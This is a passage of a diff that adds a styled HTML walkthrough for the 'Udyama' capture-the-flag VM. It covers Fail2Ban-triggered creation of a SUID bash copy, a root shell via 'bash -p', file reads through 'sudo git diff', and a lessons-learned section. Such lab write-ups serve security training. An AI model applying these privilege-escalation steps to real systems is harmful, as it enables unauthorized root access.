+<span class="cmd">ssh wronguser@&lt;target-ip&gt;</span>  <span class="comment"># attempt 5  ← ban triggered</span>
+
+<span class="comment"># Behind the scenes, Fail2Ban executes as root:
+# cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash</span></pre>
+        </div>
+        <p class="step-desc" style="color:var(--orange)">⚠ Your IP is now banned. SSH connections will be refused. <strong>Wait for the ban duration to expire</strong> (typically 60–600 seconds). This is intentional. This is Udyama. This is the effort the machine demands.</p>
+      </div>
+    </div>
+
+    <!-- STEP 7 -->
+    <div class="step-card">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-n">07</div>
+        <div class="step-title-wrap">
+          <div class="step-title">Reconnect After Ban Expiry</div>
+          <div class="step-subtitle">Patience is the Skill</div>
+        </div>
+        <span class="step-badge access">ACCESS</span>
+        <span style="color:var(--dim);font-size:18px;margin-left:8px">▾</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">Once the ban period has elapsed, SSH access is restored. Reconnect and verify the SUID binary was created:</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">terminal</span></div>
+          <pre><span class="cmd">ssh ctfplayer@UbuntuCTF</span>
+
+<span class="cmd">$ ls -la /tmp/rootbash</span>
+<span class="hl">-rwsr-xr-x 1 root root 1234567 Feb 2026 /tmp/rootbash</span>
+<span class="comment"># The 's' in -rws confirms the SUID bit is set. Owned by root.</span></pre>
+        </div>
+        <p class="step-desc">The SUID bit is confirmed. You are ready to escalate.</p>
+      </div>
+    </div>
+
+    <!-- STEP 8 -->
+    <div class="step-card">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-n">08</div>
+        <div class="step-title-wrap">
+          <div class="step-title">Privilege Escalation — Root Shell via SUID Bash</div>
+          <div class="step-subtitle">euid=0 Achieved</div>
+        </div>
+        <span class="step-badge root">ROOT</span>
+        <span style="color:var(--dim);font-size:18px;margin-left:8px">▾</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">The <code>-p</code> flag instructs bash to run in privileged mode, preserving the effective UID of the binary owner (root) rather than dropping it:</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">root shell</span></div>
+          <pre><span class="cmd">$ /tmp/rootbash -p</span>
+
+<span class="hl">rootbash-5.1#</span>
+
+<span class="cmd">rootbash-5.1# whoami</span>
+<span class="hl">root</span>
+
+<span class="cmd">rootbash-5.1# id</span>
+<span class="hl">uid=1001(ctfplayer) gid=1001(ctfplayer) euid=0(root) egid=0(root)</span></pre>
+        </div>
+        <p class="step-desc"><strong>Effective UID = 0. You are root.</strong></p>
+      </div>
+    </div>
+
+    <!-- STEP 9 -->
+    <div class="step-card">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-n">09</div>
+        <div class="step-title-wrap">
+          <div class="step-title">Flag 2 — Root Flag Captured</div>
+          <div class="step-subtitle">Challenge Complete</div>
+        </div>
+        <span class="step-badge root">ROOT</span>
+        <span style="color:var(--dim);font-size:18px;margin-left:8px">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">root</span></div>
+          <pre><span class="cmd">rootbash-5.1# cat /root/flag2.txt</span>
+<span class="flag-text">FLAG{root_shell_success}</span></pre>
+        </div>
+
+        <div class="flag-card">
+          <span class="flag-icon">🏁</span>
+          <div>
+            <div class="flag-label">Flag 2 — Root Flag Captured</div>
+            <div class="flag-value">FLAG{root_shell_success}</div>
+          </div>
+        </div>
+
+        <p class="step-desc" style="color:var(--green)">Udyama is complete.</p>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ─── FLAGS ─── -->
+<section id="flags">
+  <div class="sec-num">03 — Flags</div>
+  <h2 class="sec-h2 reveal">Captured Flags</h2>
+
+  <div style="display:flex;flex-direction:column;gap:16px;margin-bottom:48px" class="reveal">
+    <div class="flag-card">
+      <span class="flag-icon">🚩</span>
+      <div>
+        <div class="flag-label">Flag 1 — User Flag</div>
+        <div class="flag-value">FLAG{search_whatis_fail2ban}</div>
+      </div>
+    </div>
+    <div class="flag-card">
+      <span class="flag-icon">🏁</span>
+      <div>
+        <div class="flag-label">Flag 2 — Root Flag</div>
+        <div class="flag-value">FLAG{root_shell_success}</div>
+      </div>
+    </div>
+  </div>
+
+  <h3 style="font-family:var(--title);font-size:18px;color:var(--white);margin-bottom:20px;font-weight:700" class="reveal">Exploitation Summary</h3>
+  <div class="reveal" style="overflow-x:auto">
+    <table class="summary-table">
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Step</th>
+          <th>Method</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td class="td-n">1</td><td>Hidden page discovery</td><td class="td-method">http://target/hidden/secret.html</td></tr>
+        <tr><td class="td-n">2</td><td>Cookie manipulation (0 → 1)</td><td class="td-method">DevTools / Burp / curl</td></tr>
+        <tr><td class="td-n">3</td><td>SSH login with leaked creds</td><td class="td-method">ssh ctfplayer@UbuntuCTF</td></tr>
+        <tr><td class="td-n">4</td><td>Leak flag.txt → FLAG 1</td><td class="td-method">sudo git diff /dev/null /root/flag.txt</td></tr>
+        <tr><td class="td-n">5</td><td>Inspect Fail2Ban action file</td><td class="td-method">sudo git diff /etc/fail2ban/action.d/custom.conf</td></tr>
+        <tr><td class="td-n">6</td><td>Trigger ban → execute payload</td><td class="td-method">Deliberate SSH failures</td></tr>
+        <tr><td class="td-n">7</td><td>Wait for ban expiry</td><td class="td-method">Patience</td></tr>
+        <tr><td class="td-n">8</td><td>Escalate to root shell</td><td class="td-method">/tmp/rootbash -p</td></tr>
+        <tr><td class="td-n">9</td><td>Read final flag → FLAG 2</td><td class="td-method">cat /root/flag2.txt</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ─── LESSONS ─── -->
+<section id="lessons">
+  <div class="sec-num">04 — Lessons Learned</div>
+  <h2 class="sec-h2 reveal">What This Machine Teaches</h2>
+
+  <div class="lesson-list reveal">
+    <div class="lesson-card">
+      <div class="lesson-num">01</div>
+      <div class="lesson-body">
+        <h4>Never Trust Client-Side Access Controls</h4>
+        <p>A cookie value of 0 vs 1 is trivially bypassed using DevTools or Burp. Always enforce access restrictions server-side, never in a cookie value that the client can modify freely.</p>
+      </div>
+    </div>
+    <div class="lesson-card">
+      <div class="lesson-num">02</div>
+      <div class="lesson-body">
+        <h4>sudo git diff Is Dangerous</h4>
+        <p>Any command that can read arbitrary files when run as root is a privilege escalation vector. git diff with /dev/null effectively becomes a file reader. Always audit sudo rules carefully — seemingly harmless commands can be lethal.</p>
+      </div>
+    </div>
+    <div class="lesson-card">
+      <div class="lesson-num">03</div>
+      <div class="lesson-body">
+        <h4>Fail2Ban Action Files Run as Root</h4>
+        <p>If an attacker can write to or influence action files, they can execute arbitrary commands with root privileges on every ban event. The banaction fires automatically — making it a powerful persistence and escalation mechanism.</p>
+      </div>
+    </div>
+    <div class="lesson-card">
+      <div class="lesson-num">04</div>
+      <div class="lesson-body">
+        <h4>SUID Binaries Are Powerful</h4>
+        <p>A SUID copy of bash grants an instant root shell via bash -p. Never allow untrusted users to create SUID files in world-writable directories like /tmp. Monitor for SUID changes in your incident response procedures.</p>
+      </div>
+    </div>
+    <div class="lesson-card">
+      <div class="lesson-num">05</div>
+      <div class="lesson-body">
+        <h4>Persistence Pays Off</h4>
+        <p>Being banned and locked out is not the end — it is part of the challenge. Udyama (उद्यम) means effort. The machine rewards those who understand the mechanics and keep trying. The ban itself is the exploit trigger.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ─── FOOTER ─── -->
+<footer>
+  <div class="footer-sanskrit">उद्यमेन हि सिध्यन्ति कार्याणि न मनोरथैः</div>
+  <div class="footer-translation">"Tasks are accomplished through effort, not mere wishes."</div>
+  <div class="footer-meta">
+    Udyama CTF · February 2026 · Jishnu ·
+    <a href="https://archive.org/details/Udyama" style="color:var(--green);text-decoration:none">Download VM</a>
+  </div>
+</footer>
+
+<script>
+// ─── MATRIX RAIN ───────────────────────────────────────────────────────────
+const canvas = document.getElementById('matrix-canvas');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF';
+const cols = Math.floor(canvas.width / 18);
+const drops = Array(cols).fill(1);
+
+function drawMatrix() {
+  ctx.fillStyle = 'rgba(5,5,8,0.05)';
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle = '#00ff41';
+  ctx.font = '14px Share Tech Mono';
+  drops.forEach((y,i) => {
+    const char = chars[Math.floor(Math.random()*chars.length)];
+    ctx.fillText(char, i*18, y*18);
+    if(y*18 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+    drops[i]++;
+  });
+}
+setInterval(drawMatrix, 60);
+
+window.addEventListener('resize', () => {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+});
+
+// ─── SCROLL PLAYER ANIMATION ──────────────────────────────────────────────
+const player   = document.getElementById('player');
+const flag1El  = document.getElementById('flag1');
+const flag2El  = document.getElementById('flag2');
+const track    = document.getElementById('track');
+
+let flag1Captured = false;
+let flag2Captured = false;
+
+// Convert percent positions to absolute px relative to stage
+function flagPct(el) {
+  return parseFloat(el.style.top) / 100;
+}
+
+function onScroll() {
+  const scrolled = window.scrollY;
+  const maxScroll = document.body.scrollHeight - window.innerHeight;
+  const progress = Math.min(scrolled / maxScroll, 1);
+
+  // Player travels from 60px to (stage height - 60px)
+  const stageH = window.innerHeight;
+  const playerY = 60 + progress * (stageH - 120);
+  player.style.top = playerY + 'px';
+
+  // Check flag captures
+  const f1Y = flagPct(flag1El) * stageH;
+  const f2Y = flagPct(flag2El) * stageH;
+
+  if (!flag1Captured && playerY >= f1Y - 20) {
+    flag1Captured = true;
+    flag1El.classList.add('captured');
+    showBurst(f1Y);
+    player.style.filter = 'drop-shadow(0 0 16px #00ff41)';
+    setTimeout(() => { player.style.filter = 'drop-shadow(0 0 8px #00ff41)'; }, 600);
+  }
+
+  if (!flag2Captured && playerY >= f2Y - 20) {
+    flag2Captured = true;
+    flag2El.classList.add('captured');
+    showBurst(f2Y);
+    player.textContent = '🏆';
+    player.style.filter = 'drop-shadow(0 0 20px #ffd700)';
+  }
+
+  // Reset if scrolled back up
+  if (progress < 0.3 && flag1Captured) {
+    flag1Captured = false;
+    flag1El.classList.remove('captured');
+    player.textContent = '🧑‍💻';
+    player.style.filter = 'drop-shadow(0 0 8px #00ff41)';
+  }
+  if (progress < 0.6 && flag2Captured) {
+    flag2Captured = false;
+    flag2El.classList.remove('captured');
+    player.textContent = flag1Captured ? '🧑‍💻' : '🧑‍💻';
+  }
+}
+
+function showBurst(y) {
+  const stage = document.getElementById('scroll-stage');
+  const burst = document.createElement('div');
+  burst.className = 'capture-burst';
+  burst.style.top = (y - 30) + 'px';
+  stage.appendChild(burst);
+  setTimeout(() => burst.remove(), 700);
+}
+
+window.addEventListener('scroll', onScroll, { passive:true });
+
+// ─── STEP ACCORDION ───────────────────────────────────────────────────────
+function toggleStep(header) {
+  const body = header.nextElementSibling;
+  const arrow = header.querySelector('span:last-child');
+  if (body.classList.contains('open')) {
+    body.classList.remove('open');
+    arrow.textContent = '▾';
+  } else {
+    body.classList.add('open');
+    arrow.textContent = '▴';
+  }
+}
+
+// ─── SCROLL REVEAL ────────────────────────────────────────────────────────
+const io = new IntersectionObserver(entries => {
+  entries.forEach(e => { if(e.isIntersecting) e.target.classList.add('vis'); });
+}, { threshold:0.08 });
+
+document.querySelectorAll('.reveal').forEach(el => io.observe(el));
+</script>
+</body>
+</html>
